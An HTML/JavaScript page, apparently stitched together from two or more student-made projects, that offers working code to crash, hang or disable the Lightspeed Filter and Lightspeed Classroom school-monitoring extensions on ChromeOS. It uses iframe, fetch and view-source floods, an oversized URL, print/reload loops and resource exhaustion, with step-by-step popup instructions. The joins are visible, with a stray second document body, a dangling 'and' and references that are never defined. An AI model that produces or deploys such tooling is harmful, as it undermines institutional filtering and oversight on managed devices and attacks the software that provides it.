<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Extension Nuke Tool</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1e1f22;
            color: white;
            margin: 0;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        
        h1, h2, h3 {
            color: #8cc04b;
        }
        
        button {
            background-color: #8cc04b;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            margin: 5px;
        }
        
        button:disabled {
            background-color: #555;
            cursor: not-allowed;
        }
        
        #log {
            background-color: #292a2d;
            border: 1px solid #444;
            height: 200px;
            overflow-y: auto;
            padding: 10px;
            margin: 10px 0;
            font-family: monospace;
        }
        
        .progress-container {
            width: 100%;
            background-color: #444;
            border-radius: 5px;
            margin: 10px 0;
        }
        
        #attackProgress {
            height: 20px;
            background-color: #8cc04b;
            border-radius: 5px;
            width: 0%;
            transition: width 0.3s;
        }
        
        .target-status {
            padding: 5px 10px;
            border-radius: 5px;
            font-weight: bold;
        }
        
        .detected {
            background-color: #8cc04b;
        }
        
        .missing {
            background-color: #f44336;
        }
        
        .attacking {
            background-color: #ff9800;
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .target-card {
            background-color: #292a2d;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
        }
        
        .control-section {
            display: none;
        }
        
        .control-section.active {
            display: block;
        }
        
        .nav {
            display: flex;
            margin-bottom: 20px;
        }
        
        .nav-item {
            padding: 10px 20px;
            background-color: #292a2d;
            cursor: pointer;
            margin-right: 5px;
            border-radius: 5px 5px 0 0;
        }
        
        .nav-item.active {
            background-color: #8cc04b;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Extension Nuke Tool</h1>
        
        <div class="nav">
            <div class="nav-item active" data-section="nuke-section">Nuke Tool</div>
            <div class="nav-item" data-section="chromeos-section">ChromeOS Nuclear</div>
            <div class="nav-item" data-section="hanger-section">Hanger</div>
        </div>
        
        <!-- Nuke Tool Section -->
        <div id="nuke-section" class="control-section active">
            <h2>Target Extensions</h2>
            
            <div id="targets-container">
                <!-- Target cards will be added here dynamically -->
            </div>
            
            <h2>Controls</h2>
            <button id="nukeButton" disabled>Start Nuke</button>
            <button id="stopButton" disabled>Stop Nuke</button>
            
            <div class="progress-container">
                <div id="attackProgress"></div>
            </div>
            
            <h3>Status: <span id="status">INITIALIZING...</span></h3>
            
            <h3>Log</h3>
            <div id="log"></div>
        </div>
        
        <!-- ChromeOS Nuclear Section -->
        <div id="chromeos-section" class="control-section">
            <h2>ChromeOS Nuclear Options</h2>
            
            <div>
                <label>
                    <input type="checkbox" id="autoClose" checked> Auto-close Chrome pages
                </label>
            </div>
            
            <div>
                <label>
                    <input type="checkbox" id="disableChromePages" checked> Disable Chrome pages
                </label>
            </div>
            
            <div>
                <label>Target:
                    <select id="targetSelect">
                        <option value="filter">Lightspeed Filter</option>
                        <option value="classroom">Lightspeed Classroom</option>
                        <option value="all">All Targets</option>
                    </select>
                </label>
            </div>
            
            <button id="nuclearButton">Initiate Meltdown</button>
            <button id="printReloadButton">Print/Reload Attack</button>
            <button id="disableButton">Disable Protocols</button>
            <button id="emergencyStopButton">Emergency Stop</button>
            
            <h3>System Status: <span id="sysStatus">SYSTEM READY</span></h3>
        </div>
        
        <!-- Hanger Section -->
        <div id="hanger-section" class="control-section">
            <h2>Lightspeed Hanger</h2>
            <button id="hangerButton">Launch Hanger</button>
            <p>This will attempt to hang the Lightspeed Filter extension.</p>
        </div>
    </div>

    <script>
        // TARGET EXTENSIONS
        const TARGETS = {
            filter: {
                id: 'adkcpkpghahmbopkjchobieckeoaoeem',
                name: 'Lightspeed Filter',
                detected: false,
                attacking: false
            },
            classroom: {
                id: 'kkbmdgjggcdajckdlbngdjonpchpaiea',
                name: 'Lightspeed Classroom',
                detected: false,
                attacking: false
            }
        };

        // SYSTEM VARIABLES
        let isNuking = false;
        let nukeInterval;
        let attackCycle = 0;
        const MAX_CYCLES = 30;
        const nukeButton = document.getElementById('nukeButton');
        const stopButton = document.getElementById('stopButton');
        const statusEl = document.getElementById('status');
        const logEl = document.getElementById('log');
        const progressBar = document.getElementById('attackProgress');

        // Initialize target cards
        function initializeTargetCards() {
            const container = document.getElementById('targets-container');
            for (const [key, target] of Object.entries(TARGETS)) {
                const card = document.createElement('div');
                card.className = 'target-card';
                card.innerHTML = `
                    <h3>${target.name}</h3>
                    <p>Extension ID: ${target.id}</p>
                    <p>Status: <span id="status-${key}" class="target-status missing">MISSING</span></p>
                `;
                container.appendChild(card);
            }
        }

        // LOG MESSAGES
        function log(message) {
            const timestamp = new Date().toLocaleTimeString();
            logEl.innerHTML += `[${timestamp}] ${message}<br>`;
            logEl.scrollTop = logEl.scrollHeight;
        }

        // UPDATE STATUS
        function updateStatus(message) {
            statusEl.textContent = message;
        }

        // CHECK IF EXTENSION EXISTS (MORE AGGRESSIVE VERSION)
        function checkExtension(target) {
            return new Promise((resolve) => {
                // METHOD 1: FETCH MANIFEST
                fetch(`chrome-extension://${target.id}/manifest.json`)
                    .then(response => {
                        if (response.ok) {
                            resolve(true);
                        } else {
                            // METHOD 2: IFRAME INJECTION
                            const iframe = document.createElement('iframe');
                            iframe.src = `chrome-extension://${target.id}/main.js`;
                            iframe.style.display = 'none';
                            
                            iframe.onload = function() {
                                iframe.remove();
                                resolve(true);
                            };
                            
                            iframe.onerror = function() {
                                iframe.remove();
                                resolve(false);
                            };
                            
                            setTimeout(() => {
                                iframe.remove();
                                resolve(false);
                            }, 1500);
                            
                            document.body.appendChild(iframe);
                        }
                    })
                    .catch(() => {
                        resolve(false);
                    });
            });
        }

        // DETECT ALL EXTENSIONS
        async function detectExtensions() {
            let allDetected = true;
            
            for (const [key, target] of Object.entries(TARGETS)) {
                target.detected = await checkExtension(target);
                updateTargetStatus(key, target.detected ? 'detected' : 'missing');
                
                if (!target.detected) allDetected = false;
            }
            
            if (allDetected) {
                nukeButton.disabled = false;
                updateStatus('TARGETS ACQUIRED - READY TO NUKE');
                log('ALL TARGETS DETECTED - WEAPONS HOT');
            } else {
                nukeButton.disabled = true;
                updateStatus('MISSING TARGETS - CANNOT ENGAGE');
                log('WARNING: ONE OR MORE TARGETS NOT DETECTED');
            }
            
            return allDetected;
        }

        // UPDATE TARGET STATUS DISPLAY
        function updateTargetStatus(targetKey, status) {
            const statusEl = document.getElementById(`status-${targetKey}`);
            statusEl.textContent = status.toUpperCase();
            statusEl.className = `target-status ${status}`;
            TARGETS[targetKey].detected = (status === 'detected');
        }

        // NUKE AN EXTENSION (MORE AGGRESSIVE VERSION)
        async function nukeExtension(target) {
            try {
                // METHOD 1: MASSIVE IFRAME FLOOD
                const iframePromises = [];
                for (let i = 0; i < 100; i++) {
                    const iframe = document.createElement('iframe');
                    iframe.src = `chrome-extension://${target.id}/main.js`;
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    iframePromises.push(new Promise(resolve => {
                        setTimeout(() => {
                            iframe.remove();
                            resolve();
                        }, 100);
                    }));
                }
                
                // METHOD 2: VIEW-SOURCE SPAM
                const viewSourceWindows = [];
                for (let i = 0; i < 5; i++) {
                    const win = window.open(`view-source:chrome-extension://${target.id}/main.js`, `crash_${i}`);
                    if (win) viewSourceWindows.push(win);
                }
                
                // METHOD 3: FETCH SPAM (NEW)
                const fetchPromises = [];
                for (let i = 0; i < 20; i++) {
                    fetchPromises.push(
                        fetch(`chrome-extension://${target.id}/main.js`)
                            .catch(() => {})
                    );
                    fetchPromises.push(
                        fetch(`chrome-extension://${target.id}/manifest.json`)
                            .catch(() => {})
                    );
                }
                
                // METHOD 4: POST MESSAGE SPAM (NEW)
                try {
                    for (let i = 0; i < 10; i++) {
                        window.postMessage({
                            type: 'crash',
                            data: Array(1000).fill('CRASH').join('')
                        }, `chrome-extension://${target.id}`);
                    }
                } catch (e) {}
                
                // CLEANUP
                await Promise.all(iframePromises);
                await Promise.all(fetchPromises);
                setTimeout(() => {
                    viewSourceWindows.forEach(win => win && win.close());
                }, 500);
                
                return true;
            } catch (e) {
                return false;
            }
        }

        // START NUKING ALL TARGETS
        function startNuke() {
            if (isNuking) return;
            
            isNuking = true;
            attackCycle = 0;
            nukeButton.disabled = true;
            stopButton.disabled = false;
            progressBar.style.width = '0%';
            
            updateStatus('NUKE SEQUENCE INITIATED');
            log('STARTING EXTENSION ANNIHILATION PROTOCOL');
            
            // Update UI to show attacking status
            for (const key of Object.keys(TARGETS)) {
                if (TARGETS[key].detected) {
                    document.getElementById(`status-${key}`).className = 'target-status attacking';
                    document.getElementById(`status-${key}`).textContent = 'NUKE IN PROGRESS';
                    TARGETS[key].attacking = true;
                }
            }
            
            // Immediate first strike
            nukeAllExtensions();
            
            // Continuous attacks
            nukeInterval = setInterval(nukeAllExtensions, 300);
        }

        // NUKE ALL DETECTED EXTENSIONS
        async function nukeAllExtensions() {
            attackCycle++;
            progressBar.style.width = `${(attackCycle / MAX_CYCLES) * 100}%`;
            
            // Refresh detection periodically
            if (attackCycle % 5 === 0) {
                await detectExtensions();
            }
            
            let nukeResults = await Promise.all(
                Object.entries(TARGETS).map(async ([key, target]) => {
                    if (!target.detected) return false;
                    
                    const result = await nukeExtension(target);
                    log(`${target.name}: ${result ? 'DIRECT HIT' : 'MISSED TARGET'}`);
                    return result;
                })
            );
            
            // Check if we should stop
            if (attackCycle >= MAX_CYCLES || !nukeResults.some(r => r)) {
                stopNuke();
                
                if (attackCycle >= MAX_CYCLES) {
                    log('MISSION COMPLETE - TARGETS NEUTRALIZED');
                    updateStatus('EXTENSIONS DESTROYED - RELOADING...');
                    setTimeout(() => location.reload(), 2000);
                }
            }
        }

        // STOP NUKING
        function stopNuke() {
            clearInterval(nukeInterval);
            isNuking = false;
            nukeButton.disabled = false;
            stopButton.disabled = true;
            progressBar.style.width = '0%';
            
            // Reset status displays
            for (const [key, target] of Object.entries(TARGETS)) {
                if (target.detected) {
                    document.getElementById(`status-${key}`).className = 'target-status detected';
                    document.getElementById(`status-${key}`).textContent = 'DETECTED';
                    target.attacking = false;
                }
            }
            
            updateStatus('MISSION ABORTED');
            log('NUKE SEQUENCE TERMINATED');
        }

        // ChromeOS Nuclear Functions
        const CHROME_PAGES = [
            'chrome://print',
            'chrome://user-education-internals/',
            'chrome://webui-gallery/a11y'
        ];

        let currentTarget = TARGETS.filter;
        let activeProcess = null;
        let autoClose = true;
        let disableChromePages = true;

        function chromeOSNuclear() {
            updateSysStatus('INITIATING MELTDOWN');
            
            // Phase 1: View-Source Flood
            const extensions = [
                ...TARGETS.all,
                'cjpalhdlnbpafiamejdnhcphjbkeiagm', // uBlock
                'dhdgffkkebhmkfjojejmpbldmpobfkfo'  // Tampermonkey
            ];

            extensions.forEach(id => {
                const win = window.open(`view-source://chrome-extension://${id}/main.js`, '_blank');
                if(win) {
                    win.document.body.style.zoom = '1000%';
                    win.document.body.innerHTML = Array(1000).fill('<span style="white-space: pre-wrap;">NUCLEAR_TEXT_FLOAD </span>').join('');
                    
                    const observer = new MutationObserver(() => {
                        win.document.body.innerHTML += Array(100).fill('CRASH_OVERFLOW ').join('');
                    });
                    observer.observe(win.document.body, { childList: true });
                }
            });

            // Phase 2: Resource Exhaustion
            const floodMethods = [
                () => localStorage.setItem('crash', Array(1e6).join('X')),
                () => history.pushState({}, '', `?${Math.random()}`),
                () => document.body.appendChild(document.createElement('iframe')).src = 'chrome-extension://' + TARGETS.all[0] + '/main.js'
            ];

            activeProcess = setInterval(() => {
                floodMethods.forEach(method => {
                    try { method() } catch(e) {}
                });
            }, 50);

            // Phase 3: Sensory Attack
            document.body.style.animation = 'crash 0.05s infinite';
            new Audio('data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU').play().loop = true;
        }

        function handlePrintReload() {
            window.print();
            activeProcess = setInterval(() => {
                location.reload();
                window.print();
            }, 10000);
            updateSysStatus('PRINT/RELOAD ACTIVE');
        }

        function disableTarget() {
            if (disableChromePages) {
                CHROME_PAGES.forEach(page => {
                    try {
                        // Attempt to open and immediately close the page
                        const win = window.open(page, '_blank');
                        if (win) {
                            setTimeout(() => {
                                win.close();
                                updateSysStatus(`DISABLED ${page}`);
                            }, 100);
                        }
                    } catch (e) {
                        console.error(`Failed to disable ${page}:`, e);
                    }
                });
            }
            
            // Additional disable logic for other targets
            updateSysStatus('PROTOCOLS DISABLED');
        }

        function emergencyStop() {
            clearInterval(activeProcess);
            document.body.style.animation = '';
            updateSysStatus('SYSTEM HALTED');
        }

        // System Utilities
        function updateSysStatus(text) {
            document.getElementById('sysStatus').textContent = text;
        }

        // Hanger Functions
        function checkForExtension() {
            const extURL = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/blocked-image-search.png";
            fetch(extURL)
                .then(response => {
                    if (!response.ok) {
                        const launchButton = document.getElementById("hangerButton");
                        launchButton.remove();
                        const message = document.createElement("p");
                        message.innerText = "You don't have Lightspeed Filter Agent installed.";
                        message.style.userSelect = "none";
                        document.body.appendChild(message);
                    }
                })
                .catch(() => {
                    const launchButton = document.getElementById("hangerButton");
                    launchButton.remove();
                    const message = document.createElement("p");
                    message.innerText = "You don't have Lightspeed Filter Agent installed.";
                    message.style.userSelect = "none";
                    document.body.appendChild(message);
                });
        }

        function hanger() {
            let overlay = document.createElement("div");
            overlay.id = "overlay";
            overlay.style.position = "fixed";
            overlay.style.top = "0";
            overlay.style.left = "0";
            overlay.style.width = "100%";
            overlay.style.height = "100%";
            overlay.style.background = "rgba(0, 0, 0, 0.7)";
            overlay.style.color = "white";
            overlay.style.display = "flex";
            overlay.style.flexDirection = "column";
            overlay.style.alignItems = "center";
            overlay.style.justifyContent = "center";
            overlay.style.fontSize = "24px";
            overlay.style.userSelect = "none";
            overlay.style.textAlign = "center";
    
            let spinner = document.createElement("div");
            spinner.style.width = "50px";
            spinner.style.height = "50px";
            spinner.style.border = "5px solid white";
            spinner.style.borderTop = "5px solid transparent";
            spinner.style.borderRadius = "50%";
            spinner.style.animation = "spin 1s linear infinite";
    
            let style = document.createElement("style");
            style.innerHTML = `@keyframes spin { 100% { transform: rotate(360deg); } }`;
            document.head.appendChild(style);
    
            let hanging = document.createElement("div");
            hanging.innerText = "Hanging...";
            hanging.style.marginTop = "10px";
            hanging.style.userSelect = "none";
            hanging.style.textAlign = "center";

            overlay.appendChild(spinner);
            overlay.appendChild(hanging);
            document.body.appendChild(overlay);

            let amongus = "ඞ".repeat(200000); // help im stuck in 2020
            let killURL = "https://" + amongus + "@hanging..."; // this can be any blocked site (they block invalid URIs like "hanging...")
            let extWin = window.open(killURL);
    
            setTimeout(function () {
                let iframe = document.createElement("iframe"); // iframe so that lightspeed wont restore itself when the switch is flipped
                iframe.src = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/blocked-image-search.png";
                iframe.style.width = "10px";
                iframe.style.height = "10px";
                iframe.style.border = "none";
                document.body.appendChild(iframe);
                setTimeout(function() {
                    extWin.close()
                    document.body.removeChild(overlay);
                    createPopup()
                }, 1000);
            }, 1000);
        }

        function createPopup() {
            let timeOfPopupCreation = Date.now(); // this variable is for detecting if lightspeed was actually hanged or not
            const overlay = document.createElement("div");
            overlay.style.position = "fixed";
            overlay.style.top = "0";
            overlay.style.left = "0";
            overlay.style.width = "100vw";
            overlay.style.height = "100vh";
            overlay.style.background = "rgba(0, 0, 0, 0.6)";
            overlay.style.zIndex = "999";
            overlay.style.display = "flex";
            overlay.style.justifyContent = "center";
            overlay.style.alignItems = "center";

            const popup = document.createElement("div");
            popup.style.background = "#292a2d";
            popup.style.color = "white";
            popup.style.width = "600px";
            popup.style.borderRadius = "10px";
            popup.style.overflow = "hidden";
            popup.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.3)";
            popup.style.transition = "transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1)";

            const header = document.createElement("div");
            header.style.display = "flex";
            header.style.alignItems = "center";
            header.style.justifyContent = "space-between";
            header.style.background = "#1e1f22";
            header.style.padding = "10px";
            header.style.borderBottom = "1px solid #444";

            const icon = document.createElement("img");
            icon.style.width = "32px";
            icon.style.height = "32px";
            icon.style.marginLeft = "10px";
            icon.style.marginRight = "8px";
            icon.style.marginBottom = "5px";
            icon.style.marginTop = "5px";
            icon.style.userSelect = "none";

            const title = document.createElement("span");
            title.textContent = "Lightspeed Filter Agent";
            title.style.userSelect = "none";

            const leftSection = document.createElement("div");
            leftSection.style.display = "flex";
            leftSection.style.alignItems = "center";
            leftSection.appendChild(icon);
            leftSection.appendChild(title);

            header.appendChild(leftSection);

            const instructions = document.createElement("p");
            instructions.innerHTML = "Lightspeed has been hanged. To kill it, open the following URL in a new tab (don't close this one) and flip the switch titled \"Allow access to file URLs\". <br><br> chrome://extensions/?id=adkcpkpghahmbopkjchobieckeoaoeem";
            instructions.style.padding = "15px";
            instructions.style.textAlign = "center";

            const buttonContainer = document.createElement("div");
            buttonContainer.style.display = "flex";
            buttonContainer.style.justifyContent = "center";
            buttonContainer.style.padding = "10px";

            overlay.onclick = (event) => {
                if (event.target === overlay) {
                    popup.style.transform = "scale(1.03)";
                    setTimeout(() => {
                        popup.style.transform = "scale(1)";
                    }, 200);
                }
            };

            popup.appendChild(header);
            popup.appendChild(instructions);
            popup.appendChild(buttonContainer);

            overlay.appendChild(popup);
            document.body.appendChild(overlay);

	    function checkKilled() {
        	const iframe = document.createElement("iframe");
        	iframe.src = "https://blobby-boi.github.io/LightSPED-Killer-Agent/blank/"; // Attempts loading a blank page to see if lightspeed has been killed
        	iframe.style.width = "1px";
        	iframe.style.height = "1px";
        	iframe.style.position = "absolute";
        	iframe.style.left = "-9999px"; 
        	iframe.onload = () => {
        	    if (Date.now() - timeOfPopupCreation < 2000) {
            		instructions.innerHTML = "Lightspeed failed to be hanged...";
        	    } else {
            		instructions.innerHTML = "Lightspeed has been killed! You can close this tab now.";
        	    }
		    instructions.style.userSelect = "none";
		    instructions.style.pointerEvents = "none";
		    clearInterval(checkKilledInterval);
        	};
        	document.body.appendChild(iframe);

        	setTimeout(() => {
            	    document.body.removeChild(iframe);
        	}, 1000);
   	    }
	    let checkKilledInterval = setInterval(checkKilled, 1000);
        }
    </script>
</head>
<body>
    <canvas id="background"></canvas>
    <div class="title-container">
        <img style="user-select: none; pointer-events: none;" src="data:image/png;base64,..." alt="lightspeed" class="logo">
        <h2 style="user-select: none; pointer-events: none;">LightSPED Killer Agent</h2>
    </div>
    <button onclick="hanger()" style="user-select: none;">Launch</button>
    <p style="user-select: none;">By <a href="https://github.com/Blobby-Boi">Blobby Boi</a></p>
    <script> // This whole script is just for this one overused background
        const canvas = document.getElementById("background");
        const ctx = canvas.getContext("2d");

        let width, height;
        const dots = [];

        function resize() {
          width = window.innerWidth;
          height = window.innerHeight;
          canvas.width = width;
          canvas.height = height;
        }

        class Dot {
          constructor() {
            this.x = Math.random() * width;
            this.y = Math.random() * height;
            this.radius = 2;
            this.speedX = (Math.random() - 0.5) * 2;
            this.speedY = (Math.random() - 0.5) * 2;
            this.color = "#8cc04b";
          }

          update() {
            this.x += this.speedX;
            this.y += this.speedY;

            if (this.x + this.radius > width || this.x - this.radius < 0) {
              this.speedX = -this.speedX;
            }
            if (this.y + this.radius > height || this.y - this.radius < 0) {
              this.speedY = -this.speedY;
            }
          }

          draw() {
            ctx.beginPath();
            ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
            ctx.fillStyle = this.color;
            ctx.fill();
            ctx.closePath();
          }
        }

        function createDots(num) {
          for (let i = 0; i < num; i++) {
            dots.push(new Dot());
          }
        }

        function distance(dot1, dot2) {
          const dx = dot1.x - dot2.x;
          const dy = dot1.y - dot2.y;
          return Math.sqrt(dx * dx + dy * dy);
        }

        function drawLines() {
          for (let i = 0; i < dots.length; i++) {
            for (let j = i + 1; j < dots.length; j++) {
              const dist = distance(dots[i], dots[j]);

              if (dist < 150) {
                const opacity = 1 - dist / 150;
                ctx.beginPath();
                ctx.moveTo(dots[i].x, dots[i].y);
                ctx.lineTo(dots[j].x, dots[j].y);
                ctx.strokeStyle = `rgba(140, 192, 75, ${opacity})`;
                ctx.lineWidth = 1;
                ctx.stroke();
                ctx.closePath();
              }
            }
          }
        }

        function animate() {
            ctx.clearRect(0, 0, width, height);
            for (let i = 0; i < dots.length; i++) {
              dots[i].update();
              dots[i].draw();
            }
            drawLines();
      	    requestAnimationFrame(animate);
    	}

    	resize();
    	createDots(100);
    	animate();
    
        window.addEventListener("resize", resize);
    </script>
    <script>
      (function () {
        const ua = navigator.userAgent;
        const chromeMatch = ua.match(/Chrome\/(\d+)/);

        if (chromeMatch && parseInt(chromeMatch[1], 10) >= 135) {
          const overlay = document.createElement('div');
          overlay.style.position = 'fixed';
          overlay.style.top = 0;
          overlay.style.left = 0;
          overlay.style.width = '100%';
          overlay.style.height = '100%';
          overlay.style.backgroundColor = '#1e1f22';
          overlay.style.zIndex = 9999;
          overlay.style.display = 'flex';
          overlay.style.flexDirection = 'column';
          overlay.style.alignItems = 'center';
          overlay.style.justifyContent = 'center';

          const message = document.createElement('h3');
          message.textContent = 'If you are seeing this message, you are on a ChromeOS version higher than 134 and therefore this exploit will not work for you.';
          message.style.color = 'white';
	  message.style.userSelect = 'none';

          const button = document.createElement('button');
          button.textContent = 'Click here to load it anyway';
          button.style.marginTop = '20px';
          button.style.display = 'block';
          button.style.marginRight = 'auto';
          button.style.marginLeft = 'calc(50% - 100px)';
	  button.style.fontSize = '13px';
	  button.style.fontWeight = 'bold';
          button.style.width = '200px';
	  button.style.height = '35px';
	  button.style.userSelect = 'none';

          button.addEventListener('click', () => {
            overlay.remove();
          });

          overlay.appendChild(message);
          overlay.appendChild(button);
          document.body.appendChild(overlay);
        }
      })();

and 

async function createExtensionButtons() {
   	    let hasSupportedExtensions = false;

    	    for (const [name, url] of Object.entries(extensions)) {
                const success = await TryAddExtension(name, icons[name], url);
                if (success) hasSupportedExtensions = true;
    	    }

    	    if (!hasSupportedExtensions) {
                extContainer.innerHTML = "<p style='margin-left: 15px; font-size: 12px;'>No supported extensions installed :(</p>";
    	    }
	}
	
    	const iframeCountEl = document.querySelector("#iframe-count")
    	iframeCountEl.addEventListener("input", ()=>{
            document.querySelector("#iframe-count-display").textContent = iframeCountEl.value
   	})
	    
	function createIframesAndPrint(extPage, extIcon) {
    	    let printerWindow = window.open("", "_blank");
    	    printerWindow.document.title = 'T‍h‍e‍ ‍P‍r‍i‍n‍t‍3‍r';
    	    printerWindow.document.body.style.backgroundColor = '#1e1f22';

    	    let icon = printerWindow.document.createElement('link');
    	    icon.rel = 'icon';
    	    icon.href = extIcon;
    	    icon.type = 'image/x-icon';
    	    printerWindow.document.head.appendChild(icon);

    	    let printerBody = printerWindow.document.body;

    	    let loadingContainer = printerWindow.document.createElement("div");
    	    loadingContainer.style.position = "fixed";
    	    loadingContainer.style.top = "50%";
    	    loadingContainer.style.left = "50%";
    	    loadingContainer.style.transform = "translate(-50%, -50%)";
    	    loadingContainer.style.color = "white";
    	    loadingContainer.style.fontSize = "20px";
	    loadingContainer.style.fontFamily = "'Roboto', sans-serif";
    	    loadingContainer.style.textAlign = "center";

    	    let spinner = printerWindow.document.createElement("div");
    	    spinner.style.border = "4px solid rgba(255, 255, 255, 0.3)";
	    spinner.style.borderTop = "4px solid white";
            spinner.style.borderRadius = "50%";
            spinner.style.width = "40px";
            spinner.style.height = "40px";
            spinner.style.animation = "spin 1s linear infinite";
            spinner.style.margin = "0 auto 10px";

            let loadingText = printerWindow.document.createElement("div");
    	    loadingText.innerText = "Loading...";

    	    loadingContainer.appendChild(spinner);
    	    loadingContainer.appendChild(loadingText);
    	    printerBody.appendChild(loadingContainer);

    	    let style = printerWindow.document.createElement("style");
            style.innerHTML = `
        	@keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
            	}
    	    `;
	    let script = printerWindow.document.createElement("script");
            script.innerHTML = `
            	setTimeout(() => {
                    window.close();
            	}, 5000);
            `;
	    printerWindow.document.head.appendChild(style);
            printerWindow.document.body.appendChild(script);

    	    setTimeout(() => {
        	for (let i = 0; i < iframeCountEl.value; i++) {
                    const iframe = document.createElement('iframe');
                    iframe.src = extPage;
                    iframe.width = "25px";
                    iframe.height = "25px";
                    iframe.style.border = "none";
                    printerBody.appendChild(iframe);
            	}
		    
        	loadingContainer.remove();
                printerWindow.print();
                let iframes = printerWindow.document.querySelectorAll("iframe");
                iframes.forEach(iframe => iframe.remove());
            }, 1000);
        }

        createExtensionButtons();
        
        function createPopup(extName, extIcon, extPage, extId) {
            const overlay = document.createElement("div");
            overlay.style.position = "fixed";
            overlay.style.top = "0";
            overlay.style.left = "0";
            overlay.style.width = "100vw";
            overlay.style.height = "100vh";
            overlay.style.background = "rgba(0, 0, 0, 0.6)";
            overlay.style.zIndex = "999";
            overlay.style.display = "flex";
            overlay.style.justifyContent = "center";
            overlay.style.alignItems = "center";

            const popup = document.createElement("div");
            popup.style.background = "#292a2d";
            popup.style.color = "white";
            popup.style.width = "500px";
            popup.style.borderRadius = "10px";
            popup.style.overflow = "hidden";
            popup.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.3)";
            popup.style.transition = "transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1)";

            const header = document.createElement("div");
            header.style.display = "flex";
            header.style.alignItems = "center";
            header.style.justifyContent = "space-between";
            header.style.background = "#1e1f22";
            header.style.padding = "10px";
            header.style.borderBottom = "1px solid #444";

            const icon = document.createElement("img");
            icon.src = extIcon || "https://raw.githubusercontent.com/Blobby-Boi/ExtPrint3r/refs/heads/main/extension.png";
	    icon.onerror = function() {
                this.src = "https://raw.githubusercontent.com/Blobby-Boi/ExtPrint3r/refs/heads/main/extension.png";
            };
            icon.style.width = "32px";
            icon.style.height = "32px";
            icon.style.marginLeft = "10px";
            icon.style.marginRight = "8px";
            icon.style.marginBottom = "5px";
            icon.style.marginTop = "5px";
            icon.style.userSelect = "none";

            const title = document.createElement("span");
            title.textContent = extName;
            title.style.userSelect = "none";

            const leftSection = document.createElement("div");
            leftSection.style.display = "flex";
            leftSection.style.alignItems = "center";
            leftSection.appendChild(icon);
            leftSection.appendChild(title);

            const x = document.createElement("span");
            x.textContent = "×";
            x.style.background = "transparent";
            x.style.color = "#9aa0a6";
            x.style.fontSize = "24px";
            x.style.marginRight = "-4px";
            x.style.marginTop = "-22px";
            x.style.cursor = "pointer";
            x.style.userSelect = "none";
            x.style.borderRadius = "50%";
            x.style.padding = "0";
            x.style.width = "32px";
            x.style.height = "32px";
            x.style.lineHeight = "32px";
            x.style.textAlign = "center";
            x.style.display = "inline-block";

            x.onmouseover = () => {
                x.style.backgroundColor = "rgba(255, 255, 255, 0.1)";
            };

            x.onmouseout = () => {
                x.style.backgroundColor = "transparent";
            };

            x.onclick = () => document.body.removeChild(overlay);

            header.appendChild(leftSection);
            header.appendChild(x);

            const instructions = document.createElement("p");
            const settingsUrl = "chrome://extensions?id=" + extId;
            instructions.innerHTML = "Open the following URL in a new tab:<br><br><span>" + settingsUrl + "</span><br><br> Then go back to this one and press the button below which will open a new tab. Immediately press ctrl+tab and start spamming the switch called \"Allow Access to file URLs\" for about 5 seconds. Once you are done, close that tab and switch to the other one. Then, press cancel on the print dialog and the tab should close. If done correctly, the extension " + extName + " should've been killed.";
            instructions.style.padding = "15px";
            instructions.style.textAlign = "center";

            const buttonContainer = document.createElement("div");
            buttonContainer.style.display = "flex";
            buttonContainer.style.justifyContent = "center";
            buttonContainer.style.padding = "10px";

            const printButton = document.createElement("button");
            printButton.textContent = "The Print3r";
            printButton.style.width = "100px";
            printButton.style.marginTop = "-15px";
            printButton.style.marginBottom = "15px";
            printButton.onclick = () => {
                createIframesAndPrint(extPage, extIcon);
		setTimeout(() => {
                    instructions.innerHTML = extName + ' has been killed!';
		    popup.removeChild(buttonContainer);
		}, 500);
            };

            buttonContainer.appendChild(printButton);

            overlay.onclick = (event) => {
                if (event.target === overlay) {
                    popup.style.transform = "scale(1.03)";
                    setTimeout(() => {
                        popup.style.transform = "scale(1)";
                    }, 200);
                }
            };

            popup.appendChild(header);
            popup.appendChild(instructions);
            popup.appendChild(buttonContainer);

            overlay.appendChild(popup);
            document.body.appendChild(overlay);
        }

        async function GetContributorData(){
            let contributors = await (await fetch("https://api.github.com/repos/Blobby-Boi/ExtPrint3r/contributors")).json()
            return contributors
        }
        const contributorList = document.querySelector("#contributor-list")
        async function DisplayContributors(){
            let contributors = await GetContributorData()

            for(let contributor of contributors){
                console.log(contributor.avatar_url, contributor.html_url, contributor.login)
                let a = document.createElement("a")
                a.href = contributor.html_url
                a.classList.add("contributor")

                let img = document.createElement("img")
                img.src = contributor.avatar_url
                a.appendChild(img)

                contributorList.appendChild(a)
            }

            document.querySelector("#contributor-content").style.display = "block"
        }
        DisplayContributors()